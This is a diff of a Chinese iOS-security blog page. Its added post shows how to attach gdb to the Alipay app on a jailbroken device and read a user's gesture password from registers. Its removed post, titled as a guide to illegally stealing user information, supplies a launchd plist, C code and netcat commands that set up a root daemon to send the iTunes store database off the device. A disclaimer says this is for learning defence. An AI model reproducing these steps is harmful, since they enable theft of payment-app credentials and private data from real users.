@@ -7,9 +7,7 @@
 	<meta name="author" content="Rick">
 
 	
-	<meta name="description" content="10 二进制和资源文件自检 我们把自己的程序发布到 app store，但是不能保证每一个用户都是从 app store 下载官方 app，也不能保证每一个用户都不越狱。
-换句话说，我们无法保证程序运行环境在 MAC 管控策略下就绝对的安全。
-所以，在有些情况下，尤其是和钱有关系的 app ， &hellip;">
+	<meta name="description" content="11 Hack 实战——探究支付宝 App 手势密码 在之前的 iOS安全攻防（七）：Hack实战——解除支付宝app手势解锁错误次数限制中，留了一个问题，就是如何破解手势密码。 方法不唯一，本文介绍如何利用 gdb 分析破解 App 。 当没有程序源代码的情况下，我们如何利用 gdb 呢？ &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -77,6 +75,138 @@
 		
 	
 	<div id="content" class="inner">
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/Blog/blog/2016/08/25/hackshi-zhan-tan-jiu-zhi-fu-bao-app-shou-shi-mi-ma/">
+		
+			Hack实战——探究支付宝 App 手势密码</a>
+	</h2>
+	<div class="entry-content">
+		<div class="container">
+<div class="item chapter">
+    <h1 class="title"><span class="label">11</span> <span class="title">Hack 实战——探究支付宝 App 手势密码</span></h1>
+    <p>在之前的 <a href="/Blog/blog/2016/08/25/hack-shi-zhan-jie-chu-zhi-fu-bao-shou-shi-jie-suo-ci-shu-xian-zhi/">iOS安全攻防（七）：Hack实战——解除支付宝app手势解锁错误次数限制</a>中，留了一个问题，就是如何破解手势密码。</p>
+
+<p>方法不唯一，本文介绍如何利用 gdb 分析破解 App 。</p>
+
+<p>当没有程序源代码的情况下，我们如何利用 gdb 呢？</p>
+
+<p>为了确定应该如何设置断点，不得不反汇编程序来作为参考了。</p>
+
+<p>在前面的文章提到过，支付宝 app 的手势密码校验处理非常严谨，没有抛出 BOOL 判断的方法让我们可以直接修改返回值跳过验证，而是将全部操作封在了</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="k">-</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">gestureInputView:</span><span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nv">view</span> <span class="nf">didFinishWithPassword:</span><span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nv">password</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>于是，我反汇编了支付宝 app ，找到手势密码解锁的相关代码片段：</p>
+
+<div class="figure" id="figure-11-1">
+    <img src="http://ww2.sinaimg.cn/large/626e5d69gw1f75unaa1pzj20l90jyjw5.jpg" />
+
+    <p class="caption"><strong>图片 11.1</strong> guesture-password</p>
+</div>
+
+
+<p>红色箭头标注的地方，让人欣喜，这将是我们断点位置的最好选择。</p>
+
+<p>首先，查看一下相关程序段符号表：</p>
+
+<p><code>nm Portal | grep -i gestureinputview</code></p>
+
+<p>得到结果：</p>
+
+<p>nm Portal | grep -i getpassword</p>
+
+<p>得到结果：</p>
+
+<div class="figure" id="figure-11-2">
+    <img src="http://ww2.sinaimg.cn/large/626e5d69gw1f75unyvcgaj20fg04hwg4.jpg" />
+
+    <p class="caption"><strong>图片 11.2</strong> guesture-password2</p>
+</div>
+
+
+<p>确定了了关键函数的输出符号。</p>
+
+<p>启动支付宝 app ，并 gdb 该进程：
+<code>gdb -q -p 671</code></p>
+
+<p>在上述两个函数位置设置断点：
+<div class="figure" id="figure-11-3">
+    <img src="http://ww4.sinaimg.cn/large/626e5d69gw1f75up0u087j20hp02bgmb.jpg" />
+
+    <p class="caption"><strong>图片 11.3</strong> guesture-password3</p>
+</div>
+
+
+<p>可以通过 info breakpoints 查看断点：
+<div class="figure" id="figure-11-4">
+    <img src="http://ww3.sinaimg.cn/large/626e5d69gw1f75uppyzbzj20pj034my3.jpg" />
+
+    <p class="caption"><strong>图片 11.4</strong> guesture-password4</p>
+</div>
+
+
+<p>continue 到 getPassword 位置，打印函数栈：
+<div class="figure" id="figure-11-5">
+    <img src="http://ww4.sinaimg.cn/large/626e5d69gw1f75uq86ydyj20kn09en0w.jpg" />
+
+    <p class="caption"><strong>图片 11.5</strong> guesture-password5</p>
+</div>
+
+
+<p>我们可以确定了 getPassword 的返回地址是 0x00becb36 ,  对该地址加断点：</p>
+
+<p><code>b * 0xbecb36</code></p>
+
+<p>然后继续 continue ，程序将卡在上面的断点上。</p>
+
+<p>从上面的反汇编代码，我们可以知道，用户输入的密码为存在 r8 上，原始密码为存在 r0 上，我们直接打印出这两个寄存器的值：</p>
+
+<div class="figure" id="figure-11-6">
+    <img src="http://ww1.sinaimg.cn/large/626e5d69gw1f75ur9u2hlj20mm07pmxu.jpg" />
+
+    <p class="caption"><strong>图片 11.6</strong> guesture-password6</p>
+</div>
+
+
+<p>正确密码是个 “Z” 手势图画，而当前输入为 “一” 手势图画。
+可以得出结论，支付宝 app 的手势密码和大多数 app 一样，手势密码格式是字符串，9 个点分别对应字符 123456789 。</p>
+
+
+
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
+</p></p></p></div></div>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+</div>
+	<div class="tags">
+
+
+	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/Blog/blog/2016/08/25/hackshi-zhan-tan-jiu-zhi-fu-bao-app-shou-shi-mi-ma/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
 
 
     <article class="post">
@@ -1537,210 +1667,6 @@ scp /Applications/Reveal.app/Contents/SharedSupport/iOS-Libraries/libReveal.dyli
 </div>
 	
 	<div class="comments"><a href="/Blog/blog/2016/08/24/lai-hu-%5B%3F%5D-zhou-nian-ji/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/Blog/blog/2016/08/24/ru-he-fei-fa-qie-qu-yong-hu-xin-xi-%3F/">
-		
-			如何非法窃取用户信息？</a>
-	</h2>
-	<div class="entry-content">
-		<div class="container">
-<div class="item chapter">
-    <h1 class="title"><span class="label">2</span> <span class="title">后台 daemon 非法窃取用户 iTunesstore 信息</span></h1>
-    <p>本人郑重声明：并不鼓励窃取用户隐私等行为，一切 hack 学习都只是为了研究如何防御。OK，进入正题。</p>
-
-<h3>开机自启动</h3>
-
-<p>在 <a href="/Blog/blog/2016/08/19/ioshei-ke-gong-ju/">iOS 黑客工具</a>中，介绍了如何编译自己的 C 程序并手动启动。今天介绍如何使程序变为开机自启动。</p>
-
-<h4>首先打开 Xcode 创建一个 plist 属性文件，如下图所示：</h4>
-
-<div class="figure" id="figure-2-1">
-    <img src="http://ww3.sinaimg.cn/large/626e5d69gw1f74ojhy4upj20gg06cq46.jpg" />
-
-    <p class="caption"><strong>图片 2.1</strong> daemon1</p>
-</div>
-
-
-<p>其中要注意一下通信服务名，我定为 55 。用编辑器打开，即为：</p>
-
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-<span class="line-number">8</span>
-<span class="line-number">9</span>
-<span class="line-number">10</span>
-<span class="line-number">11</span>
-<span class="line-number">12</span>
-<span class="line-number">13</span>
-<span class="line-number">14</span>
-<span class="line-number">15</span>
-<span class="line-number">16</span>
-<span class="line-number">17</span>
-<span class="line-number">18</span>
-<span class="line-number">19</span>
-<span class="line-number">20</span>
-<span class="line-number">21</span>
-<span class="line-number">22</span>
-<span class="line-number">23</span>
-<span class="line-number">24</span>
-<span class="line-number">25</span>
-<span class="line-number">26</span>
-<span class="line-number">27</span>
-<span class="line-number">28</span>
-<span class="line-number">29</span>
-</pre></td><td class="code"><pre><code class="xml"><span class="line"><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
-</span><span class="line"><span class="cp">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span>
-</span><span class="line"><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="nt">&gt;</span>
-</span><span class="line"><span class="nt">&lt;dict&gt;</span>
-</span><span class="line">    <span class="nt">&lt;key&gt;</span>Program<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">    <span class="nt">&lt;string&gt;</span>/usr/bin/ncdemo<span class="nt">&lt;/string&gt;</span>
-</span><span class="line">    <span class="nt">&lt;key&gt;</span>StandardErrorPath<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">    <span class="nt">&lt;string&gt;</span>/dev/null<span class="nt">&lt;/string&gt;</span>
-</span><span class="line">    <span class="nt">&lt;key&gt;</span>SessionCreate<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">    <span class="nt">&lt;true/&gt;</span>
-</span><span class="line">    <span class="nt">&lt;key&gt;</span>ProgramArguments<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">    <span class="nt">&lt;array&gt;</span>
-</span><span class="line">        <span class="nt">&lt;string&gt;</span>/usr/bin/ncdemo<span class="nt">&lt;/string&gt;</span>
-</span><span class="line">    <span class="nt">&lt;/array&gt;</span>
-</span><span class="line">    <span class="nt">&lt;key&gt;</span>inetdCompatibility<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">    <span class="nt">&lt;dict&gt;</span>
-</span><span class="line">        <span class="nt">&lt;key&gt;</span>Wait<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">        <span class="nt">&lt;false/&gt;</span>
-</span><span class="line">    <span class="nt">&lt;/dict&gt;</span>
-</span><span class="line">    <span class="nt">&lt;key&gt;</span>Sockets<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">    <span class="nt">&lt;dict&gt;</span>
-</span><span class="line">        <span class="nt">&lt;key&gt;</span>Listeners<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">        <span class="nt">&lt;dict&gt;</span>
-</span><span class="line">            <span class="nt">&lt;key&gt;</span>SockServiceName<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">            <span class="nt">&lt;string&gt;</span>55<span class="nt">&lt;/string&gt;</span>
-</span><span class="line">        <span class="nt">&lt;/dict&gt;</span>
-</span><span class="line">    <span class="nt">&lt;/dict&gt;</span>
-</span><span class="line"><span class="nt">&lt;/dict&gt;</span>
-</span><span class="line"><span class="nt">&lt;/plist&gt;</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
-
-<p>最后，将 plist 文件 scp 至 <code>root@192.168.1.114:/System/Library/LaunchDaemons/</code>下 。</p>
-
-<h3>编写读取 iTunesstore 数据库程序</h3>
-
-<p>读取 itunesstored2.sqlitedb 信息，并输出到 stdout 中，便于我们读取。</p>
-
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-<span class="line-number">8</span>
-<span class="line-number">9</span>
-<span class="line-number">10</span>
-<span class="line-number">11</span>
-<span class="line-number">12</span>
-<span class="line-number">13</span>
-<span class="line-number">14</span>
-<span class="line-number">15</span>
-<span class="line-number">16</span>
-<span class="line-number">17</span>
-<span class="line-number">18</span>
-<span class="line-number">19</span>
-</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="cp">#include &lt;stdio.h&gt;  </span>
-</span><span class="line"> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">fcntl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
-</span><span class="line"> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
-</span><span class="line">
-</span><span class="line"> <span class="err">#</span><span class="n">define</span> <span class="n">FILE</span> <span class="s">&quot;/var/mobile/Library/com.apple.itunesstored/itunesstored2.sqlitedb&quot;</span>
-</span><span class="line">
-</span><span class="line"><span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
-</span><span class="line">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">FILE</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
-</span><span class="line">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
-</span><span class="line">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class="line">
-</span><span class="line">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
-</span><span class="line">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
-</span><span class="line">    <span class="k">while</span> <span class="p">((</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
-</span><span class="line">        <span class="n">write</span><span class="p">(</span> <span class="n">fileno</span><span class="p">(</span><span class="n">stdout</span><span class="p">),</span> <span class="n">buf</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
-</span><span class="line">    <span class="p">}</span>
-</span><span class="line">    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
-</span><span class="line">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class="line"><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
-
-<h3>编译、拷贝、签名</h3>
-
-<h4>编译方法上篇文章已经介绍清楚，这里不再重复，直接 ￥%￥＃%￥……%＃ 生成运行在 ARM 的 ncdemo</h4>
-
-<h4>将 ncdemo scp 到设备中，并登录</h4>
-
-<div class="code code">
-<pre class="code">$ scp ncdemo root@192.168.1.114:ncdemo
-$ ssh root@192.168.1.114</pre>
-</div>
-
-<h4>签名</h4>
-
-<div class="code code">
-<pre class="code"> #ldid -S ncdemo
- #mv ncdemo /usr/bin</pre>
-</div>
-
-<h3>抓取 iTunesstore 数据信息</h3>
-
-<p>这时，我们只需要利用 netcat，指定之前定义的服务名称，轻松在本地抓取设备 iTunesstore 信息.
-<code>$ nc 192.168.1.114 55 &gt; itunesstored2.sqlitedb</code></p>
-
-<h3>分析 iTunesstore 数据信息</h3>
-
-<p>好吧，这里就介绍个最简单的应用，利用string命令查看：
-<code>$ strings itunesstored2.sqlitedb</code></p>
-
-<p>于是乎，我们就清晰的得到了 iPhone/iPad 设备上都安装了哪些 app ：</p>
-
-<div class="figure" id="figure-2-2">
-    <img src="http://ww1.sinaimg.cn/large/626e5d69gw1f74ol56kfgj20df0gfgpo.jpg" />
-
-    <p class="caption"><strong>图片 2.2</strong> daemon2</p>
-</div>
-
-
-<p>当然，除了这些，你想干什么都可以……夜深了，先写到这里吧……</p>
-
-</div>
-</div>
-<p class="post-footer">
-                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-</div>
-	<div class="tags">
-
-
-	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/Blog/blog/2016/08/24/ru-he-fei-fa-qie-qu-yong-hu-xin-xi-%3F/#disqus_thread">Comments</a></div>
 	
 </div>
 </article>
